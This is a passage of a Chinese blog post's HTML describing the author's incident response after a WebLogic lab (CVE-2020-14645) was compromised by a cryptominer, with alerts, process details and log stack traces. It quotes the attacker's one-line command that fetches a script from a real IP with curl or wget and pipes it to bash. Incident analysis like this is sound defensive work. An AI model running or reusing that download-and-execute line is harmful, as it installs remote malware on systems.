@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="FBx6u1uWmY">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://chenzidu.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":false,"style":"default"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    sidebarPadding: 40
+  };
+</script>
+  <meta name="description" content="事情的起因下班得瑟的我，突然接收到了一条来自阿里云的短信???????  土豆机中了挖矿！！！??????  先说下结果: 看了一堆，啥也没查到，奶奶的那吊毛删的太干净了!">
+<meta name="keywords" content="Linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="恶意的挖矿经历-当场应急！">
+<meta property="og:url" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;08&#x2F;11&#x2F;%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81&#x2F;index.html">
+<meta property="og:site_name" content="Chen&#39;Blog">
+<meta property="og:description" content="事情的起因下班得瑟的我，突然接收到了一条来自阿里云的短信???????  土豆机中了挖矿！！！??????  先说下结果: 看了一堆，啥也没查到，奶奶的那吊毛删的太干净了!">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;08&#x2F;11&#x2F;%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81&#x2F;1.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;08&#x2F;11&#x2F;%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;08&#x2F;11&#x2F;%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81&#x2F;3.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;08&#x2F;11&#x2F;%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;08&#x2F;11&#x2F;%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81&#x2F;4.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;08&#x2F;11&#x2F;%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81&#x2F;5.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;08&#x2F;11&#x2F;%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81&#x2F;6.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;08&#x2F;11&#x2F;%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81&#x2F;6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;08&#x2F;11&#x2F;%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81&#x2F;7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;08&#x2F;11&#x2F;%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81&#x2F;8.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;08&#x2F;11&#x2F;%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81&#x2F;9.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;08&#x2F;11&#x2F;%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81&#x2F;10.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;08&#x2F;11&#x2F;%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81&#x2F;11.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;08&#x2F;11&#x2F;%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81&#x2F;7.jpg">
+<meta property="og:updated_time" content="2020-08-15T10:13:33.169Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;08&#x2F;11&#x2F;%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81&#x2F;1.jpg">
+
+<link rel="canonical" href="https://chenzidu.github.io/2020/08/11/%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>恶意的挖矿经历-当场应急！ | Chen'Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Chen'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">Life has its own fate, and meeting may not be accidental.</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chenzidu.github.io/2020/08/11/%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="ChenZIDu">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen'Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          恶意的挖矿经历-当场应急！
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-08-11 13:50:28" itemprop="dateCreated datePublished" datetime="2020-08-11T13:50:28+08:00">2020-08-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-08-15 18:13:33" itemprop="dateModified" datetime="2020-08-15T18:13:33+08:00">2020-08-15</time>
+              </span>
+
+          
+
+<span class="post-time">
+	   &nbsp; | &nbsp;
+           <span class="post-meta-item-icon">
+             <i class="fa fa-calendar-o"></i>
+           </span>
+           <span class="post-meta-item-text">字数统计:</span>
+           <span class="post-count">926(字)</span>
+           
+         </span>
+	  
+      <span class="post-time">
+	   &nbsp; | &nbsp;
+           <span class="post-meta-item-icon">
+             <i class="fa fa-calendar-o"></i>
+           </span>
+           <span class="post-meta-item-text">阅读时长:</span>
+           <span class="post-count">4(分)</span>
+           
+        </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/08/11/%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/08/11/%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="事情的起因"><a href="#事情的起因" class="headerlink" title="事情的起因"></a>事情的起因</h2><p>下班得瑟的我，突然接收到了一条来自阿里云的短信???????</p>
+<p><img src="1.jpg" alt=""></p>
+<p>土豆机中了挖矿！！！??????</p>
+<p><img src="2.png" alt=""></p>
+<p><b>先说下结果: 看了一堆，啥也没查到，奶奶的那吊毛删的太干净了!</b></p>
+<a id="more"></a>
+
+<p>这不是现场的应急教材吗????开冲!!!</p>
+<p>前段时间复现CVE-2020-14645,有朋友想玩玩，然后就在我的土豆机上开心的用docker搭建了环境。</p>
+<p>靠着我的直觉，直接停了docker,到家后登上阿里云，果然报的就是靶机。现在搞挖矿真不容易，还得拿最近爆出来的漏洞打<del>~</del></p>
+<h2 id="从阿里云上看告警监测"><a href="#从阿里云上看告警监测" class="headerlink" title="从阿里云上看告警监测"></a>从阿里云上看告警监测</h2><p><img src="3.jpg" alt=""></p>
+<p><img src="3.png" alt=""></p>
+<p>对<br><code>http://89.178.232.69:9000/seele</code>地址进行get请求</p>
+<p>动态IP没啥可看的</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">curl</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="deletion">-s</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="deletion">-s参数将不输出错误和进度信息。</span></span></pre></td></tr></table></figure>
+
+<p><img src="4.jpg" alt=""></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">/java/bin/java -server -Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,address=<span class="number">8453</span>,server=y,suspend=n </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">-Djava.compiler=NONE -Xms256m -Xmx512m -XX:CompileThreshold=<span class="number">8000</span> -cp /u01/app/oracle/middleware/wlserver/server/lib/weblogic-launcher.jar </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">-Dlaunch.use.env.classpath=<span class="keyword">true</span> -Dweblogic.Name=AdminServer </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">-Djava.security.policy=/u01/app/oracle/middleware/wlserver/server/lib/weblogic.policy </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">-Djava.system<span class="class">.<span class="keyword">class</span>.<span class="title">loader</span></span>=com.oracle.classloader.weblogic.LaunchClassLoader </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">-javaagent:/u01/app/oracle/middleware/wlserver/server/lib/debugpatch-agent.jar -ea -da:com.bea... -da:javelin... -da:weblogic... -ea:com.bea.wli... -ea:com.bea.broker... -ea:com.bea.sbconsole... -Dwls.home=/u01/app/oracle/middleware/wlserver/server -Dweblogic.home=/u01/app/oracle/middleware/wlserver/server weblogic.Server</span></pre></td></tr></table></figure>
+<p><a href="https://blog.csdn.net/benben683280/article/details/78716397" target="_blank" rel="noopener">-Xdebug 启动命令</a><br>讲的可详细了</p>
+<p>父进程id：15015<br>进程ID：27557</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">/bin/sh -c (curl -s http://89.178.232.69:9000/seele||wget -q -O- http://89.178.232.69:9000/seele)|bash</span></pre></td></tr></table></figure>
+
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">wget</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">-q, --quiet 安静模式(没有输出)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">-O --<span class="meta">output</span>-document=<span class="meta">FILE</span> 把文档写到<span class="meta">FILE</span>文件中</span></pre></td></tr></table></figure>
+<p><img src="5.jpg" alt="发现了挖矿程序"></p>
+<p><img src="6.jpg" alt="访问恶意ip"></p>
+<p><img src="6.png" alt="中控ip"></p>
+<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>先查看下weblogic的访问日志</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">oracle<span class="regexp">/Domains/</span>ExampleSilentWTDomain<span class="regexp">/servers/</span>AdminServer<span class="regexp">/logs</span></span></pre></td></tr></table></figure>
+
+<p><img src="7.png" alt="access.log"></p>
+<p>还顺带发现了几个腾讯云的恶意IP</p>
+<p><img src="8.png" alt=""></p>
+<p>在<code>ExampleSilentWTDomain.log</code>下发现了当天下午四点的攻击（8小时时差）</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">####&lt;Aug <span class="number">7</span>, <span class="number">2020</span> <span class="number">8</span>:<span class="number">50</span>:<span class="number">35</span>,<span class="number">581</span> AM UTC&gt; &lt;Error&gt; &lt;RJVM&gt; &lt;<span class="number">4695</span>b9b44637&gt; &lt;AdminServer&gt; &lt;ExecuteThread: <span class="character">'0'</span> for queue: 'weblogic.socket.Muxer'&gt; &lt;&lt;WLS Kernel&gt;&gt; &lt;&gt; &lt;<span class="number">6e5</span>ae28b-<span class="number">117</span>c-<span class="number">4080</span>-b9d7-<span class="number">25</span>c5070c1882-<span class="number">00000019</span>&gt; &lt;<span class="number">1596790235581</span>&gt; &lt;<span class="literal">[<span class="identifier">severity</span>-<span class="identifier">value</span>: <span class="number">8</span>]</span> <span class="literal">[<span class="identifier">rid</span>: <span class="number">0</span>]</span> <span class="literal">[<span class="identifier">partition</span>-<span class="identifier">id</span>: <span class="number">0</span>]</span> <span class="literal">[<span class="identifier">partition</span>-<span class="identifier">name</span>: DOMAIN]</span> &gt; &lt;BEA-<span class="number">000503</span>&gt; &lt;Incoming message header <span class="keyword">or</span> abbreviation processing failed. </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"> java.lang.ClassCastException: java.lang.UNIXProcess cannot be cast <span class="keyword">to</span> java.lang.Comparable</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">java.lang.ClassCastException: java.lang.UNIXProcess cannot be cast <span class="keyword">to</span> java.lang.Comparable</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">	at com.tangosol.util.comparator.<span class="module-access"><span class="module"><span class="identifier">ExtractorComparator</span>.</span></span>compare(<span class="module-access"><span class="module"><span class="identifier">ExtractorComparator</span>.</span></span>java:<span class="number">71</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">	at java.util.<span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>sift<span class="constructor">DownUsingComparator(PriorityQueue.<span class="params">java</span>:722)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">	at java.util.<span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>sift<span class="constructor">Down(PriorityQueue.<span class="params">java</span>:688)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">	at java.util.<span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>heapify(<span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>java:<span class="number">737</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">	at java.util.<span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>read<span class="constructor">Object(PriorityQueue.<span class="params">java</span>:797)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">	at sun.reflect.<span class="module-access"><span class="module"><span class="identifier">NativeMethodAccessorImpl</span>.</span></span>invoke0(Native Method)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">	at sun.reflect.<span class="module-access"><span class="module"><span class="identifier">NativeMethodAccessorImpl</span>.</span></span>invoke(<span class="module-access"><span class="module"><span class="identifier">NativeMethodAccessorImpl</span>.</span></span>java:<span class="number">62</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">	at sun.reflect.<span class="module-access"><span class="module"><span class="identifier">DelegatingMethodAccessorImpl</span>.</span></span>invoke(<span class="module-access"><span class="module"><span class="identifier">DelegatingMethodAccessorImpl</span>.</span></span>java:<span class="number">43</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">	at java.lang.reflect.<span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke(<span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>java:<span class="number">498</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">	at java.io.<span class="module-access"><span class="module"><span class="identifier">ObjectStreamClass</span>.</span></span>invoke<span class="constructor">ReadObject(ObjectStreamClass.<span class="params">java</span>:1170)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">	at java.io.<span class="module-access"><span class="module"><span class="identifier">ObjectInputStream</span>.</span></span>read<span class="constructor">SerialData(ObjectInputStream.<span class="params">java</span>:2178)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">	at java.io.<span class="module-access"><span class="module"><span class="identifier">ObjectInputStream</span>.</span></span>read<span class="constructor">OrdinaryObject(ObjectInputStream.<span class="params">java</span>:2069)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">	at java.io.<span class="module-access"><span class="module"><span class="identifier">ObjectInputStream</span>.</span></span>read<span class="constructor">Object0(ObjectInputStream.<span class="params">java</span>:1573)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">	at java.io.<span class="module-access"><span class="module"><span class="identifier">ObjectInputStream</span>.</span></span>read<span class="constructor">Object(ObjectInputStream.<span class="params">java</span>:431)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">	at weblogic.rjvm.<span class="module-access"><span class="module"><span class="identifier">InboundMsgAbbrev</span>.</span></span>read<span class="constructor">Object(InboundMsgAbbrev.<span class="params">java</span>:73)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">	at weblogic.rjvm.<span class="module-access"><span class="module"><span class="identifier">InboundMsgAbbrev</span>.</span></span>read(<span class="module-access"><span class="module"><span class="identifier">InboundMsgAbbrev</span>.</span></span>java:<span class="number">45</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">	at weblogic.rjvm.<span class="module-access"><span class="module"><span class="identifier">MsgAbbrevJVMConnection</span>.</span></span>read<span class="constructor">MsgAbbrevs(MsgAbbrevJVMConnection.<span class="params">java</span>:325)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">	at weblogic.rjvm.<span class="module-access"><span class="module"><span class="identifier">MsgAbbrevInputStream</span>.</span></span>init(<span class="module-access"><span class="module"><span class="identifier">MsgAbbrevInputStream</span>.</span></span>java:<span class="number">219</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">	at weblogic.rjvm.<span class="module-access"><span class="module"><span class="identifier">MsgAbbrevJVMConnection</span>.</span></span>dispatch(<span class="module-access"><span class="module"><span class="identifier">MsgAbbrevJVMConnection</span>.</span></span>java:<span class="number">557</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">	at weblogic.rjvm.t3.<span class="module-access"><span class="module"><span class="identifier">MuxableSocketT3</span>.</span></span>dispatch(<span class="module-access"><span class="module"><span class="identifier">MuxableSocketT3</span>.</span></span>java:<span class="number">666</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">	at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">BaseAbstractMuxableSocket</span>.</span></span>dispatch(<span class="module-access"><span class="module"><span class="identifier">BaseAbstractMuxableSocket</span>.</span></span>java:<span class="number">397</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">	at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">SocketMuxer</span>.</span></span>read<span class="constructor">ReadySocketOnce(SocketMuxer.<span class="params">java</span>:993)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">	at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">SocketMuxer</span>.</span></span>read<span class="constructor">ReadySocket(SocketMuxer.<span class="params">java</span>:929)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">	at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">NIOSocketMuxer</span>.</span></span>process(<span class="module-access"><span class="module"><span class="identifier">NIOSocketMuxer</span>.</span></span>java:<span class="number">599</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">	at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">NIOSocketMuxer</span>.</span></span>process<span class="constructor">Sockets(NIOSocketMuxer.<span class="params">java</span>:563)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">	at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">SocketReaderRequest</span>.</span></span>run(<span class="module-access"><span class="module"><span class="identifier">SocketReaderRequest</span>.</span></span>java:<span class="number">30</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">	at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">SocketReaderRequest</span>.</span></span>execute(<span class="module-access"><span class="module"><span 